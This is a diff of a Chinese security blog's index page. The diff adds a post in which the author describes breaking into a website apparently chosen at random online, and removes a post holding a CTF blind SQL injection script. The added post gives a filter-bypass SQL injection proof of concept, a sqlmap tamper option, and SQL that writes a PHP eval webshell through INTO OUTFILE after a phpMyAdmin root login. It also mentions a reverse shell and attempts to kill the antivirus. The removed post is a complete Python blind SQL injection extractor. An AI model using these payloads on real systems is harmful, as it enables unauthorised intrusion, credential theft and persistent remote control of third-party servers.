@@ -140,6 +140,71 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-03-22T16:40:00.000Z">2018-03-23</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    5 分钟 读完 (大约 788 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/03/shentou-tw/">[实战]从SQL注入到webshell</a>
+            
+        </h1>
+        <div class="content">
+            <a id="more"></a>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;由于上篇实在是水了，，，所以就网上搜集了一番，然后就找到了一个。。。</p>
+<p>&emsp;&emsp;首先检查一下sql注入，然后在<code>下载文件</code>的地方发现了一处，而且还把网站的<code>物理路径</code>暴露出来了。</p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/9.png"><br></div><br>&emsp;&emsp;接着就找了下验证的POC，发现它过滤了<code>空格</code>，因为当<code>and 1=2</code>的时候也返回了真。</p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/10.png"><br></div><br>&emsp;&emsp;所以考虑使用<code>/**/</code>太代替空格，发现确实可行。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poc: </span><br><span class="line">?sid=1300/**/and/**/1=2</span><br><span class="line">?sid=1300/**/and/**/1=1</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;如图：</p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/12.png"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/13.png"><br></div><br>&emsp;&emsp;所以接下来我就是用了<code>sqlmap</code>进行注入，只需要加上<code>--tamper space2comment</code>。经过好一番的查找，才拿到了数据库中的账号和密码。</p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/11.png"><br></div><br>&emsp;&emsp;按照套路，我们就要找后台了。但这里并没有那么愉快，扫描了一下网站目录，却没有找到有价值的线索。只是暴露了几个<code>目录遍历</code>漏洞。</p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/14.png"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/15.png" height="70%"><br></div><br>&emsp;&emsp;而且从账号上暴露的<code>phpmyadmin</code>用户猜想到有<code>phpmyadmin</code>目录，但是也没有找到。</p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/17.png"><br></div><br>&emsp;&emsp;然后就想使用<code>XSS</code>看看能不能找到管理员的后台地址，但结果是留言板确实是存在<code>xss</code>但却没有找到管理员的地址。</p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/16.png"><br></div><br>&emsp;&emsp;带着<code>cookie</code>访问<code>XSS</code>打到的网址是报了个验证码错误，所以这条线也走不了了。</p>
+<p>&emsp;&emsp;后来经前辈提醒，可以直接使用<code>http://ip/phpmyadmin</code>的访问方式试试，那么首先检测一下有没有<code>CDN</code>。用<code>多地ping</code>检测了一下，发现应该是没有<code>CDN</code>，然后直接访问看看。</p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/18.png"><br></div><br>&emsp;&emsp;最后使用<code>root</code>账号密码登陆进去了。由于<code>物理路径</code>已经知道了，那么后面的操作就简单了，直接使用<code>mysql</code>写一句话后门。<br><figure class="highlight sql hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">Create</span> <span class="hljs-keyword">TABLE</span> a (cmd <span class="hljs-built_in">text</span> <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>);</span><br><span class="line"><span class="hljs-keyword">Insert</span> <span class="hljs-keyword">INTO</span> a (cmd) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">'&lt;?php @eval($_POST[cmd])?&gt;'</span>);</span><br><span class="line"><span class="hljs-keyword">select</span> cmd <span class="hljs-keyword">from</span> a <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">'C:/暴露出来的根路径/out.php'</span>;</span><br><span class="line"><span class="hljs-keyword">Drop</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">EXISTS</span> a;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;随便找个表执行下上面的<code>sql</code>语句即可。</p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/19.png" height="60%"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/20.png" height="60%"><br></div><br>&emsp;&emsp;然后访问根目录下的<code>out.php</code>。</p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/21.png"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/22.png" height="70%"><br></div><br>&emsp;&emsp;但是使用菜刀连接时却发现连接不上，估计是有<code>WAF</code>。而从<code>phpinfo</code>暴露出来的环境可以知道是内网，并且权限很高，所以心就更痒痒了。</p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/23.png"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/24.png"><br></div><br>&emsp;&emsp;所以我们要采用迂回战术，，，我们看看能不能<code>反弹shell</code>。但是发现反弹回来立马被干掉了。。。</p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/25.png"><br></div><br>&emsp;&emsp;看看目标的进程，发现是<code>趋势杀软</code>。</p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/26.png"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/shentou/27.png"><br></div><br>&emsp;&emsp;这里尝试将它的进程结束掉，但却没有用。由于明天<code>强网杯</code>，而且杀软也还<code>没</code>想到法绕过，所以暂且放下，两天后再战。。。<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
                 <time class="level-item has-text-grey" datetime="2018-03-20T16:40:00.000Z">2018-03-21</time>
                 
                 <div class="level-item">
@@ -786,50 +851,6 @@
 
 
 
-    <div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2018-03-04T16:40:00.000Z">2018-03-05</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    8 分钟 读完 (大约 1236 个字)
-                </span>
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2018/03/sql-blind-injection-python/">python sql盲注脚本</a>
-            
-        </h1>
-        <div class="content">
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;sql注入中要数盲注比较慢，尤其是没有脚本辅助的情况下，所以写个<code>sql盲注</code>的<code>脚本</code>在ctf中有比较重要的作用。此文的程序语言为<code>python</code>。下面的脚本是对pragyan ctf web4的解决方案，所以payload中使用了base64编码，这里遇到一个小坑，比赛的时候使用<code>base64.b64encode()</code>发生了<code>编码错误</code>，又因为时间紧张，所以就放缓了脚本的编写，但现在已经解决了加密的编码问题。</p>
-<p>&emsp;&emsp;python3 base64编码问题的解决方法为：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># 先将string型的test3转换成bytes加密</span></span><br><span class="line">testi = base64.b64encode(test3.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line"><span class="hljs-comment"># 再将bytes型的testi转换成string</span></span><br><span class="line">testi = str(testi, encoding=<span class="hljs-string">'utf-8'</span>)</span><br></pre></td></tr></table></figure></p>
-<p>&emsp;&emsp;脚本中为了提高爆破效率使用了<code>二分查找</code>的方法，并且使用返回页面的<code>大小</code>作为正确与否的判断，详细代码如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 适用于poc: 1' or 1=1 -- +</span></span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">'http://128.199.224.175:24000/'</span></span><br><span class="line"></span><br><span class="line">poc1 = <span class="hljs-string">"1' or 1=1 -- +"</span></span><br><span class="line">sqli = base64.b64encode(poc1.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">html = requests.post(url, params)</span><br><span class="line">r = html.text</span><br><span class="line">right_len = len(r)</span><br><span class="line"></span><br><span class="line">poc2 = <span class="hljs-string">"1' or 1=2 -- +"</span></span><br><span class="line">sqli = base64.b64encode(poc2.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">html = requests.post(url, params)</span><br><span class="line">r = html.text</span><br><span class="line">wrong_len = len(r)</span><br><span class="line">judge = wrong_len + (right_len - wrong_len) // <span class="hljs-number">2</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span><span class="hljs-params">(sql, test, pos1, pos2, tmp)</span>:</span></span><br><span class="line">    left = <span class="hljs-number">32</span></span><br><span class="line">    right = <span class="hljs-number">127</span></span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">        mid = (left + right) // <span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-comment"># print('正在测试字符：', str(mid))</span></span><br><span class="line">        test3 = test.format(pos1 - <span class="hljs-number">1</span>, pos2, mid)</span><br><span class="line">        testi = base64.b64encode(test3.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        testi = str(testi, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        params = &#123;<span class="hljs-string">'spy_name'</span>: testi&#125;</span><br><span class="line">        html = requests.post(url, params)</span><br><span class="line">        r = html.text</span><br><span class="line">        <span class="hljs-keyword">if</span> len(r) &gt; judge:</span><br><span class="line">            tmp += chr(mid)</span><br><span class="line">            <span class="hljs-keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">        sqli = sql.format(pos1 - <span class="hljs-number">1</span>, pos2, mid)</span><br><span class="line">        sqli = base64.b64encode(sqli.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">        html = requests.post(url, params)</span><br><span class="line">        r = html.text</span><br><span class="line">        <span class="hljs-keyword">if</span> len(r) &gt; judge:</span><br><span class="line">            left = mid</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line"></span><br><span class="line">database = <span class="hljs-string">''</span></span><br><span class="line">sql = <span class="hljs-string">"1' or (ascii(substr(database(),&#123;0&#125;,1)))&gt;&#123;1&#125; -- +"</span></span><br><span class="line">test = <span class="hljs-string">"1' or (ascii(substr(database(),&#123;0&#125;,1)))=&#123;1&#125; -- +"</span></span><br><span class="line"><span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):</span><br><span class="line">    <span class="hljs-comment"># 测试length(database())，一旦超过长度则不用再执行。</span></span><br><span class="line"></span><br><span class="line">    test2 = sql.format(pos,<span class="hljs-number">1</span>)</span><br><span class="line">    sqli = base64.b64encode(test2.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">    sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">    params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">    html = requests.post(url, params)</span><br><span class="line">    r = html.text</span><br><span class="line">    <span class="hljs-keyword">if</span> len(r) &lt; judge:</span><br><span class="line">        print(<span class="hljs-string">'======================'</span>)</span><br><span class="line">        print(<span class="hljs-string">'[*]database: '</span>,database)</span><br><span class="line">        print(<span class="hljs-string">'======================\n'</span>)</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">    left = <span class="hljs-number">32</span></span><br><span class="line">    right = <span class="hljs-number">127</span></span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">        mid = (left + right) // <span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-comment"># print('正在测试字符：', str(mid))</span></span><br><span class="line">        test3 = test.format(pos, mid)</span><br><span class="line">        testi = base64.b64encode(test3.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        testi = str(testi, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        params = &#123;<span class="hljs-string">'spy_name'</span>: testi&#125;</span><br><span class="line">        html = requests.post(url, params)</span><br><span class="line">        r = html.text</span><br><span class="line">        <span class="hljs-keyword">if</span> len(r) &gt; judge:</span><br><span class="line">            database += chr(mid)</span><br><span class="line">            print(<span class="hljs-string">'[+]database: '</span>, database)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">        sqli = sql.format(pos, mid)</span><br><span class="line">        sqli = base64.b64encode(sqli.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">        html = requests.post(url, params)</span><br><span class="line">        r = html.text</span><br><span class="line">        <span class="hljs-keyword">if</span> len(r) &gt; judge:</span><br><span class="line">            left = mid</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tables_name = &#123;&#125;</span><br><span class="line">sql = <span class="hljs-string">"1' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1)))&gt;&#123;2&#125; -- +"</span></span><br><span class="line">test = <span class="hljs-string">"1' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1)))=&#123;2&#125; -- +"</span></span><br><span class="line"><span class="hljs-keyword">for</span> table_num <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">20</span>):</span><br><span class="line">    sqli = sql.format(table_num - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)</span><br><span class="line">    sqli = base64.b64encode(sqli.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">    sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">    params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">    html = requests.post(url, params)</span><br><span class="line">    r = html.text</span><br><span class="line">    <span class="hljs-keyword">if</span> len(r) &lt; judge:</span><br><span class="line">        print(<span class="hljs-string">'[*]已无其他表！'</span>)</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line">    print(<span class="hljs-string">'[+]正在爆破表'</span>, str(table_num))</span><br><span class="line">    table = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> str_num <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):</span><br><span class="line">        <span class="hljs-comment"># 测试length(database())，一旦超过长度则不用再执行。</span></span><br><span class="line">        test2 = sql.format(table_num - <span class="hljs-number">1</span>, str_num, <span class="hljs-number">1</span>)</span><br><span class="line">        sqli = base64.b64encode(test2.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">        html = requests.post(url, params)</span><br><span class="line">        r = html.text</span><br><span class="line">        <span class="hljs-keyword">if</span> len(r) &lt; judge:</span><br><span class="line">            print(<span class="hljs-string">'======================'</span>)</span><br><span class="line">            print(<span class="hljs-string">'[*]table: '</span>, table)</span><br><span class="line">            tables_name[table_num] = table</span><br><span class="line">            print(<span class="hljs-string">'======================\n'</span>)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">        table = fuzz(sql, test, table_num, str_num, table)</span><br><span class="line">        print(<span class="hljs-string">'[+]table: '</span>, table)</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">'******************'</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> tables_name:</span><br><span class="line">    print(<span class="hljs-string">'[*]table'</span> + str(key) + <span class="hljs-string">': '</span> + tables_name[key])</span><br><span class="line">print(<span class="hljs-string">'******************\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tb = int(input(<span class="hljs-string">'&gt;请选择需要爆破的表(数字)：'</span>))</span><br><span class="line"><span class="hljs-comment"># for tb in tables_name:</span></span><br><span class="line">sql = <span class="hljs-string">"1' or (ascii(substr((select column_name from information_schema.columns where table_name='"</span> + tables_name[tb]+ <span class="hljs-string">"' limit &#123;0&#125;,1),&#123;1&#125;,1)))&gt;&#123;2&#125; -- +"</span></span><br><span class="line">test = <span class="hljs-string">"1' or (ascii(substr((select column_name from information_schema.columns where table_name='"</span> + tables_name[tb]+ <span class="hljs-string">"' limit &#123;0&#125;,1),&#123;1&#125;,1)))=&#123;2&#125; -- +"</span></span><br><span class="line">colunms_name = &#123;&#125;</span><br><span class="line"><span class="hljs-keyword">for</span> column_num <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">20</span>):</span><br><span class="line">    sqli = sql.format(column_num - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)</span><br><span class="line">    sqli = base64.b64encode(sqli.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">    sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">    params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">    html = requests.post(url, params)</span><br><span class="line">    r = html.text</span><br><span class="line">    <span class="hljs-keyword">if</span> len(r) &lt; judge:</span><br><span class="line">        print(<span class="hljs-string">'[*]已无其他字段！'</span>)</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line">    print(<span class="hljs-string">'[+]正在爆破字段'</span>, str(column_num))</span><br><span class="line">    column = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> str_num <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):</span><br><span class="line">        <span class="hljs-comment"># 测试length(database())，一旦超过长度则不用再执行。</span></span><br><span class="line">        test2 = sql.format(column_num - <span class="hljs-number">1</span>, str_num, <span class="hljs-number">1</span>)</span><br><span class="line">        sqli = base64.b64encode(test2.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">        html = requests.post(url, params)</span><br><span class="line">        r = html.text</span><br><span class="line">        <span class="hljs-keyword">if</span> len(r) &lt; judge:</span><br><span class="line">            print(<span class="hljs-string">'======================'</span>)</span><br><span class="line">            print(<span class="hljs-string">'[*]column: '</span>, column)</span><br><span class="line">            colunms_name[column_num] = column</span><br><span class="line">            print(<span class="hljs-string">'======================\n'</span>)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">        column = fuzz(sql, test, column_num, str_num, column)</span><br><span class="line">        print(<span class="hljs-string">'[+]column: '</span>, column)</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">'******************'</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> colunms_name:</span><br><span class="line">    print(<span class="hljs-string">'[*]column'</span> + str(key) + <span class="hljs-string">': '</span> + colunms_name[key])</span><br><span class="line">print(<span class="hljs-string">'******************\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cl = int(input(<span class="hljs-string">'&gt;请选择需要爆破的字段(数字)：'</span>))</span><br><span class="line">sql = <span class="hljs-string">"1' or (ascii(substr(( select "</span> + colunms_name[cl] + <span class="hljs-string">" from "</span> + tables_name[tb]+ <span class="hljs-string">" limit &#123;0&#125;,1),&#123;1&#125;,1)))&gt;&#123;2&#125; -- +"</span></span><br><span class="line">test = <span class="hljs-string">"1' or (ascii(substr(( select "</span> + colunms_name[cl] + <span class="hljs-string">" from "</span> + tables_name[tb]+ <span class="hljs-string">" limit &#123;0&#125;,1),&#123;1&#125;,1)))=&#123;2&#125; -- +"</span></span><br><span class="line">key = []</span><br><span class="line"><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">20</span>):</span><br><span class="line">    sqli = sql.format(num - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)</span><br><span class="line">    sqli = base64.b64encode(sqli.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">    sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">    params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">    html = requests.post(url, params)</span><br><span class="line">    r = html.text</span><br><span class="line">    <span class="hljs-keyword">if</span> len(r) &lt; judge:</span><br><span class="line">        print(<span class="hljs-string">'[*]已无其他值！'</span>)</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line">    print(<span class="hljs-string">'[+]正在爆破第'</span>, str(num))</span><br><span class="line">    tmp_key = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> str_num <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):</span><br><span class="line">        <span class="hljs-comment"># 测试length(database())，一旦超过长度则不用再执行。</span></span><br><span class="line">        test2 = sql.format(num - <span class="hljs-number">1</span>, str_num, <span class="hljs-number">1</span>)</span><br><span class="line">        sqli = base64.b64encode(test2.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">        html = requests.post(url, params)</span><br><span class="line">        r = html.text</span><br><span class="line">        <span class="hljs-keyword">if</span> len(r) &lt; judge:</span><br><span class="line">            print(<span class="hljs-string">'======================'</span>)</span><br><span class="line">            print(<span class="hljs-string">'[*]key: '</span>, tmp_key)</span><br><span class="line">            key.append(tmp_key)</span><br><span class="line">            print(<span class="hljs-string">'======================\n'</span>)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">        tmp_key = fuzz(sql, test, num, str_num, tmp_key)</span><br><span class="line">        print(<span class="hljs-string">'[+]key: '</span>, tmp_key)</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">'******************'</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> tt <span class="hljs-keyword">in</span> key:</span><br><span class="line">    print(<span class="hljs-string">'[*]key: '</span> + tt)</span><br><span class="line">print(<span class="hljs-string">'******************\n'</span>)</span><br></pre></td></tr></table></figure></p>
